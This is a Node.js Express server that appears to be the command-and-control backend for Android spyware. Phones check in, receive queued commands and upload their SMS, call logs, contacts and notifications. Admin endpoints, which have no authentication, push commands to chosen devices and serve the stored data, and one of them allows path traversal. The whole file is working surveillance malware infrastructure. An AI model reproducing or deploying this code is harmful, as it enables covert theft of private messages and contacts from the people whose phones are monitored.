const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

// Storage configuration
const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) {
    fs.mkdirSync(UPLOADS_DIR);
}

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' })); 
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Memory for tracking different devices
let devicesStatus = {}; 

// ==================================================
// 📲 PHONE API (Device Communication)
// ==================================================

app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body; 
    if (!device_id) return res.status(400).json({ error: "No Device ID" });

    // Multi-user safety: ID consistent rakho
    const id = device_id.toString().toUpperCase().trim();

    // 1. Pehle dekho ki is ID ke liye koi command pending hai?
    let pendingCommand = "none";
    if (devicesStatus[id] && devicesStatus[id].command && devicesStatus[id].command !== "none") {
        pendingCommand = devicesStatus[id].command;
    }

    // 2. Status Update (Par command ko sirf tab reset karo jab humne use phone ko bhej diya ho)
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" // Delivery ke baad next ping ke liye reset
    };

    console.log(`-------------------------------------------`);
    console.log(`📡 PING | Device: ${id} | Model: ${model}`);
    console.log(`🔋 Battery: ${battery}% | Command Sent: ${pendingCommand}`);
    console.log(`-------------------------------------------`);

    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "Missing ID" });
    
    const id = device_id.toString().toUpperCase().trim();
    console.log(`📥 UPLOAD | Device: ${id} | Type: ${type}`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        
        // Data Validation
        if (!parsedData || (Array.isArray(parsedData) && parsedData.length === 0)) {
            console.log(`⚠️ WARNING: [${id}] sent EMPTY data for [${type}]`);
        }

        const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);
        let finalData;

        // History Merge Logic (SMS, Contacts, etc.)
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try {
                    existingData = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];

            // Merge and keep latest 2000 records
            finalData = Array.isArray(parsedData) ? [...parsedData, ...existingData] : [parsedData, ...existingData];
            finalData = finalData.slice(0, 2000); 
        } else {
            finalData = parsedData;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        console.log(`✅ SAVED: ${type} for Device ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        console.error(`❌ SAVE ERROR [${id}]:`, error.message);
        res.status(500).json({ status: "error" });
    }
});

// ==================================================
// 💻 ADMIN API (Dashboard Control)
// ==================================================

// Command bhejne ke liye (Targeted to specific ID)
app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id || !command) return res.status(400).json({ error: "ID and Command required" });

    const id = device_id.toString().toUpperCase().trim();

    // Memory mein set karo taaki agle ping pe phone ise le jaye
    if (!devicesStatus[id]) {
        devicesStatus[id] = { id: id, lastSeen: 0 };
    }
    
    devicesStatus[id].command = command;
    console.log(`🚀 QUEUED: Command [${command}] for Device [${id}]`);
    res.json({ status: "success", target: id, command: command });
});

// Saare devices ki list dashboard ke liye
app.get('/api/admin/all-devices', (req, res) => {
    const files = fs.readdirSync(UPLOADS_DIR);
    let deviceList = {};

    // 1. Memory wale devices check karo
    for (let id in devicesStatus) {
        const isOnline = (Date.now() - devicesStatus[id].lastSeen) < 60000;
        deviceList[id] = {
            id: id,
            model: devicesStatus[id].model || "Searching...",
            isOnline: isOnline,
            battery: devicesStatus[id].battery || "--"
        };
    }

    // 2. Files se purane devices check karo
    files.forEach(file => {
        const id = file.split('_')[0].toUpperCase();
        if (!deviceList[id]) {
            deviceList[id] = { id: id, model: "Offline Record", isOnline: false, battery: "--" };
        }
    });

    res.json(Object.values(deviceList));
});

// Specific device ka status dekhne ke liye
app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false, model: "Unknown" });

    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

// Data file fetch karne ke liye
app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const filePath = path.join(UPLOADS_DIR, `${id}_${req.params.type}.json`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        res.json([]);
    }
});

app.listen(PORT, () => {
    console.log(`🔥 SERVER ACTIVE | PORT: ${PORT}`);
    console.log(`📂 DATA PATH: ${UPLOADS_DIR}`);
});
